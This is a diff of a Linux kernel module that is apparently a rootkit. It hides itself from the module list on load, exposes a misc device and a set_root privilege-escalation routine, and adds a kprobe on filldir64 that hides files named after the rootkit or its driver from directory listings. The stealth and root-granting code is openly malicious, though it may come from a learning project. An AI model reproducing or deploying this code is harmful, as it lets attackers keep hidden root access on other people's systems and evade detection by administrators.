@@ -1,27 +1,33 @@
 #include <linux/init.h>
-#include <linux/printk.h>
 #include <linux/miscdevice.h>
 #include <linux/module.h>
 #include <linux/fs.h>
 #include <linux/cred.h>
 #include <linux/sched.h>
 #include <linux/stat.h>
+#include <linux/kprobes.h>
+#include <linux/dirent.h>
+#include <linux/uaccess.h>
 
 #include "include/core.h"
 #include "include/debug.h"
 
 
-static int      __init mymisc_init(void);
-static void     __exit mymisc_exit(void);
+static int      __init mod_init(void);
+static void     __exit mod_exit(void);
 static int 	    mymisc_open(struct inode *i, struct file *f);
 static int 	    mymisc_release(struct inode *i, struct file *f);
 static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off);
 static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off);
 static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg);
+static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs);
+
+
 int set_root(void);
 int hide(void);
 int unhide(void);
 
+//############# DRIVER #############
 
 int hidden;
 static struct list_head *prev_module;
@@ -125,13 +131,16 @@ static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t le
 
         return len;        
 }
-
+ 
 //ioctl
 static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg)
 {
     RK_DEBUG("Device with ioctl...!!!\n");
     return 0;
 }
+
+//############# DISCRETION #############
+
 
 int hide(void)
 {   
@@ -173,28 +182,68 @@ int unhide(void)
 
 }
 
-static int __init mymisc_init(void)
+//############# KPROBE #############$
+
+static struct kprobe kp = 
+{
+    .symbol_name = "filldir64"
+};
+
+
+static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
+{
+    
+	char *filename = (char *)regs->si;
+
+    if (
+        strcmp(filename, RK_NAME) == 0 ||
+        strcmp(filename, RK_DRIVER) == 0
+    )
+    {
+        regs->dx = 0;
+    }
+	return 0;
+
+}
+
+//############# INIT & CLEANUP #############
+static int __init mod_init(void)
 {
 
     hide();
-	int r;
-	r = misc_register(&mymisc);
-	if (r < 0)
+	int ret;
+	ret = misc_register(&mymisc);
+	if (ret < 0)
     {
-            RK_DEBUG("misc_register() failed: %d\n", r);
-		    return r;
+        RK_DEBUG("misc_register() failed: %d\n", ret);
+        return ret;
     }
 
-    RK_DEBUG("Device successfully registered\n");       
+    RK_DEBUG("Device successfully registered\n");
+
+
+	kp.pre_handler = handler_pre;
+	ret = register_kprobe(&kp);
+	if (ret < 0) {
+		RK_DEBUG("register_kprobe failed, returned %d\n", ret);
+		return ret;
+	}
+	RK_DEBUG("filldir64: at %px\n", kp.addr);
+	RK_DEBUG("handler_pre: at %px\n", &handler_pre);
+
+    //list_del(&kp.list);
 	return 0;
 }
 
 
-static void __exit mymisc_exit(void)
+static void __exit mod_exit(void)
 {
     misc_deregister(&mymisc);
     RK_DEBUG("misc_register exit done !!!\n");
-
+    
+    unregister_kprobe(&kp);
+    //faire un list del de kp.list
+    RK_DEBUG("kprobe unregistered\n");
 }
 
 int set_root(void)
@@ -230,11 +279,11 @@ int set_root(void)
     return 0;
 }    
 
-module_init(mymisc_init)
-module_exit(mymisc_exit)
+module_init(mod_init)
+module_exit(mod_exit)
 
-MODULE_LICENSE("");
+MODULE_LICENSE("GPL");
 MODULE_AUTHOR("en vrai j'ai une privesc ca va");
 MODULE_DESCRIPTION("simple misc device");
-MODULE_VERSION("");
+MODULE_VERSION("0.1.0");
 
